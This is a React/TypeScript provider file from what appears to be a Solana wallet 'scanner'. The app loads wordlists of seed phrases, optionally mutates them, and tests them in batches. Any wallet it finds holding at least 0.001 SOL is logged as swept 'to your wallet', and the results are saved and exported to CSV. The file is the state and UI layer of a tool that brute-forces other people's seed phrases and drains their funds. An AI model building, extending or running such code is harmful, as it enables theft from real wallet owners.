"use client"

import type React from "react"
import { createContext, useContext, useState, useEffect, useRef } from "react"
import { scannerService, type WalletResult } from "../services/scanner-service"
import { addSystemLog } from "../services/blockchain-monitor"

// Define the context type
type ScannerContextType = {
  scanning: boolean
  tested: number
  found: number
  results: WalletResult[]
  totalSol: number
  currentPhrase: string
  scanRate: number
  useMutation: boolean
  batchSize: number
  scanStats: {
    totalTested: number
    totalFound: number
    elapsedTime: number
    phrasesPerSecond: number
    successRate: number
  }
  error: string | null
  wordlistsLoaded: boolean
  startScanning: () => void
  pauseScanning: () => void
  resetScanning: () => void
  exportToCsv: () => void
  loadPhrases: (phrases: string[]) => void
  toggleMutation: (value: boolean) => void
  updateBatchSize: (size: number) => void
}

// Create the context
const ScannerContext = createContext<ScannerContextType | null>(null)

// Create a provider component
export function ScannerProvider({ children }: { children: React.ReactNode }) {
  const [scanning, setScanning] = useState(false)
  const [tested, setTested] = useState(0)
  const [found, setFound] = useState(0)
  const [results, setResults] = useState<WalletResult[]>([])
  const [totalSol, setTotalSol] = useState(0)
  const [currentPhrase, setCurrentPhrase] = useState("")
  const [scanRate, setScanRate] = useState(0)
  const [useMutation, setUseMutation] = useState(true)
  const [batchSize, setBatchSize] = useState(10)
  const [scanStats, setScanStats] = useState({
    totalTested: 0,
    totalFound: 0,
    elapsedTime: 0,
    phrasesPerSecond: 0,
    successRate: 0,
  })
  const [error, setError] = useState<string | null>(null)
  const [wordlistsLoaded, setWordlistsLoaded] = useState(false)

  // Use refs to track initialization
  const initialized = useRef(false)
  const statsInterval = useRef<NodeJS.Timeout | null>(null)
  const scannerStatusInterval = useRef<NodeJS.Timeout | null>(null)

  // Initialize the scanner
  useEffect(() => {
    if (initialized.current) return

    try {
      console.log("Initializing scanner provider...")

      // Set up callbacks
      scannerService.setUpdateCallback((result) => {
        setResults((prev) => [result, ...prev])
        setTotalSol((prev) => prev + result.balance)
        setFound((prev) => prev + 1)

        // Log the result
        if (result.swept) {
          addSystemLog("SUCCESS", `💰 Swept ${result.balance} SOL from ${result.publicKey} to your wallet`)
        } else if (result.balance > 0) {
          addSystemLog(
            "INFO",
            `🔍 Found ${result.balance} SOL in ${result.publicKey} but couldn't sweep: ${result.error || "Unknown error"}`,
          )
        }
      })

      scannerService.setProgressCallback((testedCount, foundCount) => {
        setTested(testedCount)
        setFound(foundCount)

        // Save progress to localStorage for persistence
        localStorage.setItem("scanner_tested", testedCount.toString())
        localStorage.setItem("scanner_found", foundCount.toString())
      })

      // Set balance threshold
      scannerService.setBalanceThreshold(0.001) // 0.001 SOL minimum

      // Restore mutation setting from localStorage
      const savedMutation = localStorage.getItem("scanner_mutation")
      if (savedMutation !== null) {
        const useMutationValue = savedMutation === "true"
        setUseMutation(useMutationValue)
        scannerService.setUseMutation(useMutationValue)
      } else {
        // Set mutation option with default
        scannerService.setUseMutation(useMutation)
      }

      // Restore batch size from localStorage
      const savedBatchSize = localStorage.getItem("scanner_batch_size")
      if (savedBatchSize !== null) {
        const batchSizeValue = Number.parseInt(savedBatchSize, 10)
        setBatchSize(batchSizeValue)
        scannerService.setBatchSize(batchSizeValue)
      } else {
        // Set batch size with default
        scannerService.setBatchSize(batchSize)
      }

      // Check if scanner was running before page refresh
      const wasRunning = localStorage.getItem("scanner_running") === "true"
      const savedTested = Number.parseInt(localStorage.getItem("scanner_tested") || "0", 10)
      const savedFound = Number.parseInt(localStorage.getItem("scanner_found") || "0", 10)

      // Restore state
      setTested(savedTested)
      setFound(savedFound)

      // Restore results from localStorage if available
      const savedResults = localStorage.getItem("scanner_results")
      if (savedResults) {
        try {
          const parsedResults = JSON.parse(savedResults)
          setResults(parsedResults)

          // Calculate total SOL from results
          const totalSolValue = parsedResults.reduce((sum: number, result: WalletResult) => sum + result.balance, 0)
          setTotalSol(totalSolValue)

          console.log(`Restored ${parsedResults.length} results from localStorage`)
        } catch (e) {
          console.error("Failed to restore results:", e)
        }
      }

      // Restore wordlists if available
      const savedWordlists = localStorage.getItem("scanner_wordlists")
      if (savedWordlists) {
        try {
          const phrases = JSON.parse(savedWordlists)
          scannerService.loadPhrases(phrases)
          setWordlistsLoaded(true)
          addSystemLog("INFO", `Restored ${phrases.length} phrases from previous session`)
        } catch (e) {
          console.error("Failed to restore wordlists:", e)
        }
      }

      // Restart scanner if it was running
      if (wasRunning) {
        console.log("Restarting scanner from previous session")
        setScanning(true)
        scannerService.startScanning().catch((err) => {
          setError(err.message || "An error occurred during scanning")
          setScanning(false)
          localStorage.setItem("scanner_running", "false")
        })
      }

      initialized.current = true

      // Start stats update interval
      statsInterval.current = setInterval(() => {
        const stats = scannerService.getScanStats()
        setScanStats(stats)
        setScanRate(scannerService.getScanRate())

        // Update current phrase
        setCurrentPhrase(scannerService.getCurrentPhrase())

        // Save results to localStorage periodically
        if (results.length > 0) {
          // Only save up to 100 results to avoid localStorage size limits
          const resultsToSave = results.slice(0, 100)
          localStorage.setItem("scanner_results", JSON.stringify(resultsToSave))
        }
      }, 1000)

      // Start scanner status check interval
      scannerStatusInterval.current = setInterval(() => {
        // Check if scanner is still running in the service
        const isServiceRunning = scannerService.isScanning()

        // If UI thinks it's running but service doesn't, sync the state
        if (scanning && !isServiceRunning) {
          console.log("Scanner service stopped unexpectedly, updating UI state")
          setScanning(false)
          localStorage.setItem("scanner_running", "false")
        }

        // If service is running but UI doesn't think so, sync the state
        if (!scanning && isServiceRunning) {
          console.log("Scanner service running but UI shows stopped, updating UI state")
          setScanning(true)
          localStorage.setItem("scanner_running", "true")
        }
      }, 5000)
    } catch (err) {
      console.error("Error initializing scanner:", err)
      setError((err as Error).message || "Failed to initialize scanner")
    }

    // Cleanup function
    return () => {
      if (statsInterval.current) {
        clearInterval(statsInterval.current)
      }
      if (scannerStatusInterval.current) {
        clearInterval(scannerStatusInterval.current)
      }
    }
  }, [useMutation, batchSize, results])

  // Start scanning
  const startScanning = () => {
    setScanning(true)
    setError(null)
    addSystemLog("INFO", "Starting scanner...")

    // Save state to localStorage
    localStorage.setItem("scanner_running", "true")

    scannerService
      .startScanning()
      .then(() => {
        setScanning(false)
        localStorage.setItem("scanner_running", "false")
      })
      .catch((err) => {
        setError(err.message || "An error occurred during scanning")
        setScanning(false)
        localStorage.setItem("scanner_running", "false")
      })
  }

  // Pause scanning
  const pauseScanning = () => {
    setScanning(false)
    scannerService.pauseScanning()
    addSystemLog("INFO", "Scanner paused")
    localStorage.setItem("scanner_running", "false")
  }

  // Reset scanning
  const resetScanning = () => {
    setScanning(false)
    setTested(0)
    setFound(0)
    setResults([])
    setTotalSol(0)
    setCurrentPhrase("")
    setScanRate(0)
    setScanStats({
      totalTested: 0,
      totalFound: 0,
      elapsedTime: 0,
      phrasesPerSecond: 0,
      successRate: 0,
    })
    setError(null)
    scannerService.resetScanning()
    addSystemLog("INFO", "Scanner reset")

    // Clear localStorage
    localStorage.removeItem("scanner_running")
    localStorage.removeItem("scanner_tested")
    localStorage.removeItem("scanner_found")
    localStorage.removeItem("scanner_results")
  }

  // Export results to CSV
  const exportToCsv = () => {
    const csv = scannerService.exportToCsv()
    const blob = new Blob([csv], { type: "text/csv" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `sol-scanner-results-${new Date().toISOString()}.csv`
    document.body.appendChild(a)
    a.click()
    document.body.removeChild(a)
    addSystemLog("INFO", "Exported results to CSV")
  }

  // Load custom phrases
  const loadPhrases = (phrases: string[]) => {
    if (!phrases || phrases.length === 0) {
      console.warn("Attempted to load empty phrases array")
      return
    }

    console.log(`Loading ${phrases.length} phrases into scanner`)
    scannerService.loadPhrases(phrases)
    setWordlistsLoaded(true)
    addSystemLog("INFO", `Loaded ${phrases.length} custom phrases`)

    // Save wordlists to localStorage
    try {
      localStorage.setItem("scanner_wordlists", JSON.stringify(phrases))
      console.log("Saved wordlists to localStorage")
    } catch (e) {
      console.error("Failed to save wordlists to localStorage:", e)
      // If localStorage fails due to size limits, try to save a smaller subset
      if (phrases.length > 1000) {
        try {
          const smallerSet = phrases.slice(0, 1000)
          localStorage.setItem("scanner_wordlists", JSON.stringify(smallerSet))
          console.log("Saved reduced wordlist (1000 phrases) to localStorage due to size limits")
        } catch (e2) {
          console.error("Failed to save reduced wordlist to localStorage:", e2)
        }
      }
    }
  }

  // Toggle mutation
  const toggleMutation = (value: boolean) => {
    setUseMutation(value)
    scannerService.setUseMutation(value)
    localStorage.setItem("scanner_mutation", value.toString())
  }

  // Set batch size
  const updateBatchSize = (size: number) => {
    setBatchSize(size)
    scannerService.setBatchSize(size)
    localStorage.setItem("scanner_batch_size", size.toString())
  }

  const value = {
    scanning,
    tested,
    found,
    results,
    totalSol,
    currentPhrase,
    scanRate,
    scanStats,
    useMutation,
    batchSize,
    error,
    wordlistsLoaded,
    startScanning,
    pauseScanning,
    resetScanning,
    exportToCsv,
    loadPhrases,
    toggleMutation,
    updateBatchSize,
  }

  return <ScannerContext.Provider value={value}>{children}</ScannerContext.Provider>
}

// Custom hook to use the scanner context
export function useScanner() {
  const context = useContext(ScannerContext)
  if (!context) {
    throw new Error("useScanner must be used within a ScannerProvider")
  }
  return context
}
